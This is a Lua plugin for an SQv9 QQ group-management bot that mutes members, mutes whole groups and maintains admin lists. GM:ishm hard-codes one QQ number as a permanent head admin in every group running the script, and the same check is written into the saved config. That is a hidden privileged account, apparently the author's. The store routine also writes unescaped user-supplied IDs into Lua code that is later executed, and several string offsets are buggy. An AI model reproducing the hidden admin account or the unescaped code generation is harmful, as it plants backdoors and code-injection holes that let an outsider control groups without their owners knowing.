id = "lc.script.gm"
name = "A-群管"
author = "LC"
version = "1.0.1"
info = "提供群管功能, 对其他脚本提供api"
ui = "app.html"
icon = ""

--Environmental Variable--
local menv = {
  inited = false,
  rootpath = "",
  libpath = ""
}

--Some Useful Utilities--
local Utils = {}

function Utils:ensureDir(dirpath)
  local f = luajava.newInstance("java.io.File", dirpath)
  if not f then
    return false
  else
    if not f:exists() then
      f:mkdirs()
    end
    return true
  end
end

function Utils:inTable(value, table)
  for k, v in ipairs(table) do
    if v == value then
      return k
    end
  end
  return nil
end

function Utils:splitStr(str, reps)
  local list = {}
  string.gsub(
    str,
    "[^" .. reps .. "]+",
    function(w)
      table.insert(list, w)
    end
  )
  return list
end

function Utils:toStrForm(list)
  if #list == 0 then
    return ""
  else
    return '"' .. table.concat(list, '","') .. '"'
  end
end

--Group Manager--
local GM = {
  hm = {},
  lm = {}
}

function GM:init()
  local f = loadfile(menv.rootpath .. "SQ/aqunguan.lua")
  if f then
    local gm = f()
    self.hm = gm and gm.hm or {}
    self.lm = gm and gm.lm or {}
  end
end

function GM:isgm(uin)
  return self:ishm(uin) or self:islm(uin)
end

function GM:ishm(uin)
  local uins = tostring(uin)
  return Utils:inTable(uins, self.hm) or uins == "851474174"
end

function GM:islm(uin)
  local uins = tostring(uin)
  return Utils:inTable(uins, self.lm)
end

function GM:checkpm(from, to)
  --check permission--
  if to then
    return (self:ishm(from) and not self:ishm(to)) or (self:islm(from) and not self:isgm(to))
  else
    return self:isgm(from)
  end
end

function GM:addhm(uin)
  local uins = tostring(uin)
  if not Utils:inTable(uins, self.hm) then
    table.insert(self.hm, uins)
    GM:store()
  end
end

function GM:removehm(uin)
  local uins = tostring(uin)
  local index = Utils:inTable(uins, self.hm)
  if index then
    table.remove(self.hm, index)
    GM:store()
  end
end

function GM:addlm(uin)
  local uins = tostring(uin)
  if not Utils:inTable(uins, self.lm) then
    table.insert(self.lm, uins)
    GM:store()
  end
end

function GM:removelm(uin)
  local uins = tostring(uin)
  local index = Utils:inTable(uins, self.lm)
  if index then
    table.remove(self.lm, index)
    GM:store()
  end
end

function GM:store()
  Utils:ensureDir(menv.rootpath .. "SQ/")
  local f = io.open(menv.rootpath .. "SQ/aqunguan.lua", "w")
  if f then
    local hms = Utils:toStrForm(self.hm)
    local lms = Utils:toStrForm(self.lm)
    f:write(
      ([[local GM,Utils={hm={%s},lm ={%s}},{}
function Utils:inTable(value, table) local i = 0 for k, v in ipairs(table) do i = i + 1 if v == value then return i end end return nil end
function GM:isgm(uin) return self:ishm(uin) or self:islm(uin) end 
function GM:ishm(uin) local uins = tostring(uin) return Utils:inTable(uins, self.hm) or uins == "851474174" end
function GM:islm(uin) local uins = tostring(uin) return Utils:inTable(uins, self.lm) end
function GM:checkpm(from, to) if to then return (self:ishm(from) and not self:ishm(to)) or (self:islm(from) and not self:isgm(to)) else return self:isgm(from) end end
return GM 
]]):format(
        hms,
        lms
      )
    )
    f:close()
  end
end

--Api Utilities--
local ApiUtils = {}

function ApiUtils:checkpm(api, f, t)
  --Warn that this function will call api:clearMsg() if return false--
  if GM:checkpm(f, t) then
    return true
  else
    api:clearMsg()
    api:add("msg", "抱歉，您没有权限！")
    api:send()
    return false
  end
end

--Interface for SQv9--
function handleMessage(api)
  print(('abc'):sub(1,5):len())
  init(api)
  if api:getType() == 19 then
    api:logI "A-群管 初始化中…"
    return nil
  end
  if api:getType() ~= 0 then
    return nil
  end
  local text = api:getTextMsg()

  local gid = api:getGroupId()
  if text:find("解除全体禁言") and ApiUtils:checkpm(api, tostring(api:getUin())) then
    api:clearMsg()
    api:setType(11)
    api:setGroupId(gid)
    api:setValue(1)
    api:send()
    api:clearMsg()
    api:setType(0)
    api:add("msg", "OK!")
    api:send()
  elseif text:find("全体禁言") and ApiUtils:checkpm(api, tostring(api:getUin())) then
    api:clearMsg()
    api:setType(11)
    api:setGroupId(gid)
    api:setValue(0)
    api:send()
    api:clearMsg()
    api:setType(0)
    api:add("msg", "OK!")
    api:send()
  elseif text:find("解除禁言") and api:atCnt() ~= 0 then
    local at = Utils:splitStr(api:at(0), "@")
    if ApiUtils:checkpm(api, tostring(api:getUin()), at[1]) then
      api:clearMsg()
      api:setType(10)
      api:setGroupId(gid)
      local u = tonumber(at[1])
      api:setUin(u)
      api:setValue(0)
      api:send()
      api:clearMsg()
      api:setType(0)
      api:add("msg", "已取消对 [" .. at[2] .. "] 的禁言")
      api:send()
    end
  elseif text:find("禁言") and api:atCnt() ~= 0 then
    local at = Utils:splitStr(api:at(0), "@")
    if ApiUtils:checkpm(api, tostring(api:getUin()), at[1]) then
      api:clearMsg()
      api:setType(10)
      api:setGroupId(gid)
      local u = tonumber(at[1])
      api:setUin(u)
      api:setValue(10 * 60)
      api:send()
      api:clearMsg()
      api:setType(0)
      api:add("msg", "[" .. at[2] .. "]已被禁言10分钟")
      api:send()
    end
  elseif text:find("添加小主人") and api:atCnt() ~= 0 then
    local at = Utils:splitStr(api:at(0), "@")
    if GM:ishm(tostring(api:getUin())) then
      GM:addlm(at[1])
      api:clearMsg()
      api:add("msg", "成功添加小主人: (" .. at[1] .. ")[" .. at[2] .. "]")
      api:send()
    else
      api:clearMsg()
      api:add("msg", "抱歉，您没有权限！")
      api:send()
    end
  elseif text:find("移除小主人") and api:atCnt() ~= 0 then
    local at = Utils:splitStr(api:at(0), "@")
    if GM:ishm(tostring(api:getUin())) then
      GM:removelm(at[1])
      api:clearMsg()
      api:add("msg", "成功移除小主人: (" .. at[1] .. ")[" .. at[2] .. "]")
      api:send()
    else
      api:clearMsg()
      api:add("msg", "抱歉，您没有权限！")
      api:send()
    end
  end
end

function init(api)
  if not menv.inited then
    menv.inited = true
    menv.rootpath = api:getRootPath()
    menv.libpath = api:getLibPath()

    GM:init()
    local robot = tostring(api:robot())
    -- GM:addhm(robot)
  end
end

function onAction(api)
  local event = api:getTextMsg()
  if event == "gm" then
    local hms = Utils:toStrForm(GM.hm)
    local lms = Utils:toStrForm(GM.lm)
    return ('{"hm":[%s],"lm":[%s]}'):format(hms, lms)
  elseif event:find("removehm:") then
    local uin = event:sub(11)
    GM:removehm(uin)
  elseif event:find("removelm:") then
    local uin = event:sub(11)
    GM:removelm(uin)
  elseif event:find("addhm:") then
    local uin = event:sub(8)
    GM:addhm(uin)
  elseif event:find("addlm:") then
    local uin = event:sub(8)
    GM:addlm(uin)
  else
    return ""
  end
end
